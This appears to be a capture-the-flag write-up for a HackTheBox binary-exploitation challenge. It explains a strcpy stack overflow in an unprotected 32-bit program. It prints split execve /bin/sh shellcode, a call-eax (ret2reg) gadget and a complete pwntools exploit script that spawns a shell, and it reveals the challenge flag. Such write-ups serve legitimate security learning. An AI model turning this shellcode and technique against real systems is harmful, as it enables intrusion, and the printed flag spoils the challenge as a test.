# Space
## DESCRIPTION:
roaming in a small space
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 32 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0720a66d-d835-43c6-a70b-aa9c354ba5ba)


> BINARY PROTECTIONS --> no protection enabled.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6e3fe610-f9db-4552-9c18-7a74fe05c4c7)


2. After decompiled the binary, we know the vuln is at the sym.vuln where it does strcpy from our input at the sym.main which held up to 31 buffers.
3. But at sym.vuln, our buffers copied to a variable with 10 buffers. Obviously it trigger BOF.
4. The problem is there is no interesting function to jump to and remembering the NX is disabled, the concept here must be `ret2reg`.

### PROBLEMS

- Well it seems we don't have enough spaces after the EIP for our shellcode.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b2c624ff-951f-4f0a-8dd5-420034c2204d)


- Knowing this, hence we need to divide our shellcode. The first one to reach the EIP then use `jmp esp` or `call eax` register then send the other after that which jump to the 11th offset at the stack.
- Then execute our shellcode.


### SHELLCODE

> 1st shell

```asm
xor ecx, ecx
push ecx
push 0xb 
pop eax
jmp $+11
```

> 2nd shell

```asm
xor edx, edx
push 0x68732f2f # //sh
push 0x6e69622f # bin
mov ebx, esp
int 0x80
nop 
nop 
```

#### NOTES: in 32 bit, we use ebx , ecx and edx instead of rdi, rsi, rdx. Also don't forget the order 👍.

5. Actually the intended solution must be using `jmp esp` i guess since we want to jump onto the the 11th offset, but i managed to solve it using `call eax` (ret2reg).

> FULL SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './space'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()
call_eax = 0x08049019
log.info('CALL_EAX gadget --> %#0x', call_eax)

# 8 bytes
# we can't do mov eax, 0xb. Because the length shall be 10
# why 11?? Because distance from first A to last A is 11 
# it will loop through the last offset before 8 bytes space
first_shell = """
xor ecx, ecx
push ecx
push 0xb 
pop eax
jmp $+11
"""
shell_1 = asm(first_shell)
print('[INFO] --> LENGTH SHELL 1',len(shell_1))

# 18 bytes
# adding 2 NOPs as paddings so our shellcode length shall be exact 18.
second_shell = """
xor edx, edx
push 0x68732f2f # //sh
push 0x6e69622f # bin
mov ebx, esp
int 0x80
nop 
nop 
"""
shell_2 = asm(second_shell)
print('[INFO] --> LENGTH SHELL 2',len(shell_2))

p = flat([
    shell_2,
    call_eax,
    shell_1
])

sh.sendlineafter(b'>',p)
sh.interactive()
```

> TEST LOCALY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dd458eab-5cff-4e1e-989b-4f03d8ffaa96)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/982cddd9-2b93-4fdd-80c4-c040702cc703)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bcc1afa2-6f00-4665-b555-d888cecd3c69)


6. Got the flag!

## FLAG

```
HTB{sh3llc0de_1n_7h3_5p4c3}
```
